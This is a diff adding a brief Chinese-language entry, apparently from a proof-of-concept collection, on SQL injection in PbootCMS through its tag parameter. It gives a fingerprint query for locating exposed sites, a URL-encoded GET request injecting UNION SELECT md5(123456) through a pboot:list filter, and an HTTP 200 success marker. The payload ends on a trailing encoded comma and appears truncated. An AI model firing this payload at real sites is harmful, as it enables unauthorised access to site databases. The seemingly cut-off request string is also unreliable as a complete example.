@@ -1,0 +1,6 @@
+# PbootCMStag存在Sql注入漏洞
+
+PbootCMStag ｜ SQL注入 ｜ —
+- **指纹**：`app="PBOOTCMS"`
+- **请求**：`GET /?tag=%7Dsql%3A%20%20%7Bpboot%3Alist%20filter%3D1%3D2%29UNION%28SELECT%2F%2A%2A%2F1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2Cmd5%28123456%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C`
+- **响应特征**：200
